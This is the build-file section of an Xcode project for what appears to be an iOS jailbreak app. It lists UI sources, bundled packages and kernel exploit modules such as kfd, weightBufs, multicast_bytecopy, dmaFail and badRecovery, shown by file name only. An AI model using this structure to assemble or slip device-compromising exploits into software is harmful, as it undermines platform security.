		042479B92B66916B0082581B /* DOGlobalAppearance.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479A02B66916B0082581B /* DOGlobalAppearance.m */; };
		042479E52B66B0DD0082581B /* Preferences.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 042479E42B66B0DD0082581B /* Preferences.framework */; };
		0443A9B12B79D9C10014C933 /* DOPSListItemsController.m in Sources */ = {isa = PBXBuildFile; fileRef = 0443A9AF2B79D9C10014C933 /* DOPSListItemsController.m */; };
		04C2469C2B73220400E17924 /* DOUpdateViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C246982B73220400E17924 /* DOUpdateViewController.m */; };
		04C2469D2B73220400E17924 /* DOUpdateCircleView.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C246992B73220400E17924 /* DOUpdateCircleView.m */; };
		04C246A12B73225800E17924 /* DODownloadViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C246A02B73225800E17924 /* DODownloadViewController.m */; };
		04C246AE2B74ACA200E17924 /* DOAppSwitch.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C246AD2B74ACA200E17924 /* DOAppSwitch.m */; };
		04C246B12B74B05800E17924 /* DOPkgManagerPickerView.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C246B02B74B05800E17924 /* DOPkgManagerPickerView.m */; };
		04C246B32B74B65900E17924 /* PkgManagers.plist in Resources */ = {isa = PBXBuildFile; fileRef = 04C246B22B74B65900E17924 /* PkgManagers.plist */; };
		04DD0B352B7BA38C0055DE4F /* DOLicenseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 04DD0B342B7BA38C0055DE4F /* DOLicenseViewController.m */; };
		04DD0B372B7BA6180055DE4F /* LICENSE.md in Resources */ = {isa = PBXBuildFile; fileRef = 04DD0B362B7BA6180055DE4F /* LICENSE.md */; };
		04DD0B3A2B7BF3E80055DE4F /* LICENSE_libc.md in Resources */ = {isa = PBXBuildFile; fileRef = 04DD0B392B7BF3E80055DE4F /* LICENSE_libc.md */; };
		04DD0B3D2B7C88210055DE4F /* DOLogCrashViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 04DD0B3C2B7C88210055DE4F /* DOLogCrashViewController.m */; };
		04DD0B402B7CBD3D0055DE4F /* Themes.plist in Resources */ = {isa = PBXBuildFile; fileRef = 04DD0B3F2B7CBD3D0055DE4F /* Themes.plist */; };
		04DD0B442B7CBE2E0055DE4F /* DOThemeManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 04DD0B432B7CBE2E0055DE4F /* DOThemeManager.m */; };
		04DD0B472B7CBEEA0055DE4F /* DOTheme.m in Sources */ = {isa = PBXBuildFile; fileRef = 04DD0B462B7CBEEA0055DE4F /* DOTheme.m */; };
		04DD0B592B7D19E60055DE4F /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 04DD0B5B2B7D19E60055DE4F /* Localizable.strings */; };
		51F19D052BBF456200896361 /* libpartial.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 51AB98D92BBF44390042EA7B /* libpartial.a */; };
		8C029F432B4DFD5D0071DE58 /* DOExploitManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C029F422B4DFD5D0071DE58 /* DOExploitManager.m */; };
		8C029F462B4DFD910071DE58 /* DOBootstrapper.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C029F452B4DFD910071DE58 /* DOBootstrapper.m */; };
		8C029F4E2B4E1FF30071DE58 /* DOExploit.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C029F4D2B4E1FF30071DE58 /* DOExploit.m */; };
		8C029F602B4E25350071DE58 /* DOEnvironmentManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C029F5F2B4E25350071DE58 /* DOEnvironmentManager.m */; };
		8C029F632B4E2E140071DE58 /* DOJailbreaker.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C029F622B4E2E140071DE58 /* DOJailbreaker.m */; };
		8C029F662B4E2E970071DE58 /* libcompression.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C029F652B4E2E7D0071DE58 /* libcompression.tbd */; };
		8C029F682B4E31D50071DE58 /* libMobileGestalt.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C029F672B4E31D50071DE58 /* libMobileGestalt.tbd */; };
		8C029F6B2B4E320E0071DE58 /* libz.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C029F6A2B4E320E0071DE58 /* libz.tbd */; };
		8C05B00F2B631532001A7CF3 /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; platformFilter = ios; };
		8C05B0142B6315DB001A7CF3 /* badRecovery.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C05B0132B6315DB001A7CF3 /* badRecovery.m */; };
		8C05B0152B631738001A7CF3 /* badRecovery.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 8C05B0032B63152B001A7CF3 /* badRecovery.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		8C05B0182B632925001A7CF3 /* badRecovery.s in Sources */ = {isa = PBXBuildFile; fileRef = 8C05B0172B632925001A7CF3 /* badRecovery.s */; };
		8C05C59F2B75A1770097A931 /* bootstrap_1800.tar.zst in Resources */ = {isa = PBXBuildFile; fileRef = 8C05C59E2B759F8A0097A931 /* bootstrap_1800.tar.zst */; };
		8C05C5A02B75A17A0097A931 /* bootstrap_1900.tar.zst in Resources */ = {isa = PBXBuildFile; fileRef = 8C05C59D2B759F8A0097A931 /* bootstrap_1900.tar.zst */; };
		8C2131912B50CA4B008E682C /* krkw.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131782B50CA4B008E682C /* krkw.h */; };
		8C2131922B50CA4B008E682C /* kread_sem_open.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21317B2B50CA4B008E682C /* kread_sem_open.h */; };
		8C2131932B50CA4B008E682C /* kread_IOSurface.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21317C2B50CA4B008E682C /* kread_IOSurface.h */; };
		8C2131942B50CA4B008E682C /* kread_kqueue_workloop_ctl.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21317D2B50CA4B008E682C /* kread_kqueue_workloop_ctl.h */; };
		8C2131952B50CA4B008E682C /* IOSurface_shared.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21317E2B50CA4B008E682C /* IOSurface_shared.h */; };
		8C2131962B50CA4B008E682C /* kwrite_IOSurface.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131802B50CA4B008E682C /* kwrite_IOSurface.h */; };
		8C2131972B50CA4B008E682C /* kwrite_sem_open.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131812B50CA4B008E682C /* kwrite_sem_open.h */; };
		8C2131982B50CA4B008E682C /* kwrite_dup.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131822B50CA4B008E682C /* kwrite_dup.h */; };
		8C2131992B50CA4B008E682C /* static_info.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131842B50CA4B008E682C /* static_info.h */; };
		8C21319B2B50CA4B008E682C /* dynamic_info.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131872B50CA4B008E682C /* dynamic_info.h */; };
		8C21319C2B50CA4B008E682C /* puaf.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131882B50CA4B008E682C /* puaf.h */; };
		8C21319D2B50CA4B008E682C /* common.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131892B50CA4B008E682C /* common.h */; };
		8C21319E2B50CA4B008E682C /* smith.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21318B2B50CA4B008E682C /* smith.h */; };
		8C21319F2B50CA4B008E682C /* physpuppet.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21318C2B50CA4B008E682C /* physpuppet.h */; };
		8C2131A02B50CA4B008E682C /* landa.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21318D2B50CA4B008E682C /* landa.h */; };
		8C2131A12B50CA4B008E682C /* perf.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21318E2B50CA4B008E682C /* perf.h */; };
		8C2131A22B50CA4B008E682C /* info.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C21318F2B50CA4B008E682C /* info.h */; };
		8C2131A32B50CA4B008E682C /* libkfd.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2131902B50CA4B008E682C /* libkfd.h */; };
		8C2875212BD850B4008B24DA /* LICENSE_libgrabkernel2.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C2875202BD850B4008B24DA /* LICENSE_libgrabkernel2.md */; };
		8C296BAC2BE049E4007C2AD1 /* DOPSExploitListItemsController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C296BAB2BE049E4007C2AD1 /* DOPSExploitListItemsController.m */; };
		8C296BAE2BE05914007C2AD1 /* LICENSE_plooshinit.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C296BAD2BE05914007C2AD1 /* LICENSE_plooshinit.md */; };
		8C2B1FEA2B53238D009BA166 /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; platformFilter = ios; };
		8C2B1FF02B5324DE009BA166 /* dmaFail.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C2B1FEF2B5324DE009BA166 /* dmaFail.h */; };
		8C2B1FF42B53492B009BA166 /* dmaFail.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 8C2B1FDF2B532374009BA166 /* dmaFail.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		8C2B1FF52B534C2F009BA166 /* dmaFail.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C2B1FF12B53251E009BA166 /* dmaFail.c */; };
		8C46D7252B588973002899DB /* libzstd in Frameworks */ = {isa = PBXBuildFile; productRef = 8C46D7242B588973002899DB /* libzstd */; };
		8C4ABEB62B52094100B43C9B /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; };
		8C4ABEB92B520E7B00B43C9B /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; platformFilter = ios; };
		8C4ABEBE2B52274300B43C9B /* DOPreferenceManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C4ABEBD2B52274300B43C9B /* DOPreferenceManager.m */; };
		8C512B912B5C9F9100C6F14A /* sileo.deb in Resources */ = {isa = PBXBuildFile; fileRef = 8C512B8B2B5C9DE800C6F14A /* sileo.deb */; };
		8C512B922B5C9F9400C6F14A /* zebra.deb in Resources */ = {isa = PBXBuildFile; fileRef = 8C512B8C2B5C9DE800C6F14A /* zebra.deb */; };
		8C56D4BF2B7C0DF2001C03D3 /* LICENSE_ChOma.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4B82B7C0DF2001C03D3 /* LICENSE_ChOma.md */; };
		8C56D4C02B7C0DF2001C03D3 /* LICENSE_Fugu15_Rootful.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4B92B7C0DF2001C03D3 /* LICENSE_Fugu15_Rootful.md */; };
		8C56D4C12B7C0DF2001C03D3 /* LICENSE_dimentio.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4BA2B7C0DF2001C03D3 /* LICENSE_dimentio.md */; };
		8C56D4C22B7C0DF2001C03D3 /* LICENSE_Fugu15.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4BB2B7C0DF2001C03D3 /* LICENSE_Fugu15.md */; };
		8C56D4C32B7C0DF2001C03D3 /* LICENSE_ElleKit.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4BC2B7C0DF2001C03D3 /* LICENSE_ElleKit.md */; };
		8C56D4C42B7C0DF2001C03D3 /* LICENSE_XPF.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4BD2B7C0DF2001C03D3 /* LICENSE_XPF.md */; };
		8C56D4C52B7C0DF2001C03D3 /* LICENSE_opainject.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4BE2B7C0DF2001C03D3 /* LICENSE_opainject.md */; };
		8C56D4C92B7C102B001C03D3 /* LICENSE_Sileo.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4C62B7C102B001C03D3 /* LICENSE_Sileo.md */; };
		8C56D4CA2B7C102B001C03D3 /* LICENSE_Procursus.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4C72B7C102B001C03D3 /* LICENSE_Procursus.md */; };
		8C56D4CB2B7C102B001C03D3 /* LICENSE_Zebra.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4C82B7C102B001C03D3 /* LICENSE_Zebra.md */; };
		8C56D4CD2B7C118B001C03D3 /* LICENSE_kfd.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C56D4CC2B7C118B001C03D3 /* LICENSE_kfd.md */; };
		8C58E5592B7EAF8000E3ADAA /* CoreServices.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C58E5582B7EAF8000E3ADAA /* CoreServices.framework */; };
		8C5FA8D72BDD36B6008C246F /* weightBufs.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8D62BDD36B6008C246F /* weightBufs.h */; settings = {ATTRIBUTES = (Public, ); }; };
		8C5FA8DB2BDD36B6008C246F /* weightBufs.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA8D42BDD36B6008C246F /* weightBufs.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		8C5FA8E72BDD36BF008C246F /* multicast_bytecopy.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8E62BDD36BF008C246F /* multicast_bytecopy.h */; settings = {ATTRIBUTES = (Public, ); }; };
		8C5FA8EB2BDD36BF008C246F /* multicast_bytecopy.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA8E42BDD36BF008C246F /* multicast_bytecopy.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		8C5FA8F22BDD439A008C246F /* weightBufs.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA8F12BDD439A008C246F /* weightBufs.m */; };
		8C5FA8F62BDD4480008C246F /* multicast_bytecopy.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA8F32BDD43A9008C246F /* multicast_bytecopy.m */; };
		8C5FA91A2BDD47D5008C246F /* iokit.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8F82BDD47D4008C246F /* iokit.h */; };
		8C5FA91B2BDD47D5008C246F /* model_tmp.hwx in Resources */ = {isa = PBXBuildFile; fileRef = 8C5FA8F92BDD47D4008C246F /* model_tmp.hwx */; };
		8C5FA91C2BDD47D5008C246F /* _ANEClient.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FA2BDD47D4008C246F /* _ANEClient.h */; };
		8C5FA91D2BDD47D5008C246F /* _ANECloneHelper.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FB2BDD47D4008C246F /* _ANECloneHelper.h */; };
		8C5FA91E2BDD47D5008C246F /* _ANEDaemonConnection.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FC2BDD47D4008C246F /* _ANEDaemonConnection.h */; };
		8C5FA91F2BDD47D5008C246F /* _ANEDaemonProtocol.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FD2BDD47D4008C246F /* _ANEDaemonProtocol.h */; };
		8C5FA9202BDD47D5008C246F /* _ANEDataReporter.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FE2BDD47D4008C246F /* _ANEDataReporter.h */; };
		8C5FA9212BDD47D5008C246F /* _ANEDeviceController.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA8FF2BDD47D4008C246F /* _ANEDeviceController.h */; };
		8C5FA9222BDD47D5008C246F /* _ANEDeviceInfo.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9002BDD47D4008C246F /* _ANEDeviceInfo.h */; };
		8C5FA9232BDD47D5008C246F /* _ANEErrors.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9012BDD47D4008C246F /* _ANEErrors.h */; };
		8C5FA9242BDD47D5008C246F /* _ANEHashEncoding.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9022BDD47D4008C246F /* _ANEHashEncoding.h */; };
		8C5FA9252BDD47D5008C246F /* _ANEIOSurfaceObject.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9032BDD47D4008C246F /* _ANEIOSurfaceObject.h */; };
		8C5FA9262BDD47D5008C246F /* _ANELog.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9042BDD47D4008C246F /* _ANELog.h */; };
		8C5FA9272BDD47D5008C246F /* _ANEModel.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9052BDD47D4008C246F /* _ANEModel.h */; };
		8C5FA9282BDD47D5008C246F /* _ANEPerformanceStats.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9062BDD47D4008C246F /* _ANEPerformanceStats.h */; };
		8C5FA9292BDD47D5008C246F /* _ANEProgramForEvaluation.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9072BDD47D4008C246F /* _ANEProgramForEvaluation.h */; };
		8C5FA92A2BDD47D5008C246F /* _ANEQoSMapper.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9082BDD47D4008C246F /* _ANEQoSMapper.h */; };
		8C5FA92B2BDD47D5008C246F /* _ANERequest.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9092BDD47D4008C246F /* _ANERequest.h */; };
		8C5FA92C2BDD47D5008C246F /* _ANEStrings.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA90A2BDD47D4008C246F /* _ANEStrings.h */; };
		8C5FA92D2BDD47D5008C246F /* AppleNeuralEngine-Structs.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA90B2BDD47D4008C246F /* AppleNeuralEngine-Structs.h */; };
		8C5FA92E2BDD47D5008C246F /* AppleNeuralEngine.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA90C2BDD47D4008C246F /* AppleNeuralEngine.h */; };
		8C5FA92F2BDD47D5008C246F /* NSCopying.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA90D2BDD47D4008C246F /* NSCopying.h */; };
		8C5FA9302BDD47D5008C246F /* NSSecureCoding.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA90E2BDD47D4008C246F /* NSSecureCoding.h */; };
		8C5FA9312BDD47D5008C246F /* aneProgram.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9102BDD47D4008C246F /* aneProgram.h */; };
		8C5FA9322BDD47D5008C246F /* IOSurface.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9112BDD47D4008C246F /* IOSurface.c */; };
		8C5FA9332BDD47D5008C246F /* exploit.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9122BDD47D4008C246F /* exploit.h */; };
		8C5FA9342BDD47D5008C246F /* ANEDirectIn.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9132BDD47D4008C246F /* ANEDirectIn.h */; };
		8C5FA9352BDD47D5008C246F /* exploit.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9142BDD47D4008C246F /* exploit.m */; };
		8C5FA9362BDD47D5008C246F /* ANEDirectIn.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9152BDD47D4008C246F /* ANEDirectIn.c */; };
		8C5FA9372BDD47D5008C246F /* IOGPU.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9162BDD47D4008C246F /* IOGPU.c */; };
		8C5FA9382BDD47D5008C246F /* utils.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9172BDD47D5008C246F /* utils.c */; };
		8C5FA9392BDD47D5008C246F /* IOSurface.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9182BDD47D5008C246F /* IOSurface.h */; };
		8C5FA93A2BDD47D5008C246F /* IOGPU.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9192BDD47D5008C246F /* IOGPU.h */; };
		8C5FA93B2BDD4F98008C246F /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; platformFilter = ios; };
		8C5FA93C2BDD4F9D008C246F /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; platformFilter = ios; };
		8C5FA9402BDD5039008C246F /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA93F2BDD5039008C246F /* IOKit.framework */; };
		8C5FA9422BDD503D008C246F /* IOSurface.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA9412BDD503D008C246F /* IOSurface.framework */; };
		8C5FA9442BDD5062008C246F /* CoreML.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA9432BDD5062008C246F /* CoreML.framework */; };
		8C5FA95A2BDD6C0C008C246F /* IOSurfaceRoot.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9462BDD6C0B008C246F /* IOSurfaceRoot.c */; };
		8C5FA95B2BDD6C0C008C246F /* mcast.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9472BDD6C0B008C246F /* mcast.h */; };
		8C5FA95C2BDD6C0C008C246F /* necp.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9482BDD6C0B008C246F /* necp.h */; };
		8C5FA95D2BDD6C0C008C246F /* port_utils.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9492BDD6C0B008C246F /* port_utils.c */; };
		8C5FA95E2BDD6C0C008C246F /* IOSurfaceRoot.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA94A2BDD6C0B008C246F /* IOSurfaceRoot.h */; };
		8C5FA95F2BDD6C0C008C246F /* necp.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA94B2BDD6C0B008C246F /* necp.c */; };
		8C5FA9602BDD6C0C008C246F /* port_utils.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA94C2BDD6C0B008C246F /* port_utils.h */; };
		8C5FA9612BDD6C0C008C246F /* kernel_base.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA94D2BDD6C0B008C246F /* kernel_base.c */; };
		8C5FA9622BDD6C0C008C246F /* IOGPU.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA94E2BDD6C0B008C246F /* IOGPU.h */; };
		8C5FA9632BDD6C0C008C246F /* iokit.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA94F2BDD6C0B008C246F /* iokit.h */; };
		8C5FA9642BDD6C0C008C246F /* spray.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9502BDD6C0B008C246F /* spray.h */; };
		8C5FA9652BDD6C0C008C246F /* exploit.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9512BDD6C0B008C246F /* exploit.c */; };
		8C5FA9662BDD6C0C008C246F /* mcast.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9522BDD6C0C008C246F /* mcast.c */; };
		8C5FA9672BDD6C0C008C246F /* kernel_rw.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9532BDD6C0C008C246F /* kernel_rw.c */; };
		8C5FA9682BDD6C0C008C246F /* IOGPU.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9542BDD6C0C008C246F /* IOGPU.c */; };
		8C5FA9692BDD6C0C008C246F /* spray.c in Sources */ = {isa = PBXBuildFile; fileRef = 8C5FA9552BDD6C0C008C246F /* spray.c */; };
		8C5FA96A2BDD6C0C008C246F /* xpaci.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9562BDD6C0C008C246F /* xpaci.h */; };
		8C5FA96B2BDD6C0C008C246F /* kernel_base.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9572BDD6C0C008C246F /* kernel_base.h */; };
		8C5FA96C2BDD6C0C008C246F /* kernel_rw.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9582BDD6C0C008C246F /* kernel_rw.h */; };
		8C5FA96D2BDD6C0C008C246F /* exploit.h in Headers */ = {isa = PBXBuildFile; fileRef = 8C5FA9592BDD6C0C008C246F /* exploit.h */; };
		8C5FA96E2BDD7898008C246F /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA93F2BDD5039008C246F /* IOKit.framework */; };
		8C5FA96F2BDD789C008C246F /* IOSurface.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C5FA9412BDD503D008C246F /* IOSurface.framework */; };
		8C5FA9712BDD81EF008C246F /* LICENSE_weightBufs.md in Resources */ = {isa = PBXBuildFile; fileRef = 8C5FA9702BDD81EF008C246F /* LICENSE_weightBufs.md */; };
		8C609C9E2C19B4270023DD12 /* NSString+Version.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C609C9C2C19AECF0023DD12 /* NSString+Version.m */; };
		8C609C9F2C19B6FA0023DD12 /* libkrw-dopamine.deb in Resources */ = {isa = PBXBuildFile; fileRef = 8C609C992C19AC250023DD12 /* libkrw-dopamine.deb */; };
		8C6599DB2C555A60000FF57F /* DOPSJetsamListItemsController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C6599DA2C555A60000FF57F /* DOPSJetsamListItemsController.m */; };
		8C6599DD2C555A71000FF57F /* DOPSJetsamListItemsController.h in Sources */ = {isa = PBXBuildFile; fileRef = 8C6599DC2C555A71000FF57F /* DOPSJetsamListItemsController.h */; };
		8C71981A2ABF0E82003C6658 /* DOAppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C7198192ABF0E82003C6658 /* DOAppDelegate.m */; };
		8C71981D2ABF0E82003C6658 /* DOSceneDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C71981C2ABF0E82003C6658 /* DOSceneDelegate.m */; };
		8C7198252ABF0E84003C6658 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8C7198242ABF0E84003C6658 /* Assets.xcassets */; };
		8C7198282ABF0E84003C6658 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8C7198262ABF0E84003C6658 /* LaunchScreen.storyboard */; };
		8C71982B2ABF0E84003C6658 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C71982A2ABF0E84003C6658 /* main.m */; };
		8C9E46292ACA1CC700B5456A /* UIImage+Blur.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C9E46282ACA1CC700B5456A /* UIImage+Blur.m */; };
		8CB94F042B59E17A0098BAFD /* basebin.tc in Resources */ = {isa = PBXBuildFile; fileRef = 8CB94F022B59E17A0098BAFD /* basebin.tc */; };
		8CB94F052B59E17A0098BAFD /* basebin.tar in Resources */ = {isa = PBXBuildFile; fileRef = 8CB94F032B59E17A0098BAFD /* basebin.tar */; };
		8CBF1A4A2EC3B71700EB2308 /* UIImage+JPEG2000.m in Sources */ = {isa = PBXBuildFile; fileRef = 8CBF1A492EC3B71700EB2308 /* UIImage+JPEG2000.m */; };
		8CC139822B53DE6C00230143 /* NSData+Hex.m in Sources */ = {isa = PBXBuildFile; fileRef = 8CC139812B53DE6C00230143 /* NSData+Hex.m */; };
		8CC139832B53E05300230143 /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08372B4F682500A32B61 /* IOKit.framework */; };
		8CCD2FC42B77AAA000F9C5DA /* basebin-link.deb in Resources */ = {isa = PBXBuildFile; fileRef = 8CCD2FC32B77AA9200F9C5DA /* basebin-link.deb */; };
		8CCD8A882B6F16D0004B72B0 /* libroot.deb in Resources */ = {isa = PBXBuildFile; fileRef = 8CCD8A832B6F165A004B72B0 /* libroot.deb */; };
		8CDD07AA2B4F619000A32B61 /* kfd.h in Headers */ = {isa = PBXBuildFile; fileRef = 8CDD07A92B4F619000A32B61 /* kfd.h */; settings = {ATTRIBUTES = (Public, ); }; };
		8CDD07AF2B4F619000A32B61 /* kfd.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD07A72B4F619000A32B61 /* kfd.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		8CDD08342B4F63E100A32B61 /* kfd.m in Sources */ = {isa = PBXBuildFile; fileRef = 8CDD07B32B4F639100A32B61 /* kfd.m */; };
		8CDD08362B4F682000A32B61 /* IOSurface.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08352B4F682000A32B61 /* IOSurface.framework */; };
		8CDD08382B4F682500A32B61 /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08372B4F682500A32B61 /* IOKit.framework */; };
		8CDD08412B4F6D8700A32B61 /* libgrabkernel2.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD083B2B4F6D8200A32B61 /* libgrabkernel2.a */; };
		8CDD08462B4F6DD800A32B61 /* libchoma.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08432B4F6DD800A32B61 /* libchoma.dylib */; };
		8CDD08472B4F6DD800A32B61 /* libxpf.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CDD08442B4F6DD800A32B61 /* libxpf.dylib */; };
